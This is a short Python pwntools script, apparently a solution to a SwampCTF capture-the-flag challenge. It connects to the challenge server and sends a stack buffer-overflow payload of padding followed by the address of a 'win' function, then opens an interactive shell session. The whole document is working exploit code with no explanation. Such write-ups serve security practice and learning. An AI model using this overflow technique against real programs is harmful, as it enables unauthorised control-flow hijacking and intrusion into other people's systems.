from pwn import *

#p = process("./binary")
p = remote("chals.swampctf.com", 40001)
win = 0x0000000000401186

pause()
p.sendline(b'a' *0xa + b'b' * 8 + p64(win))
p.interactive()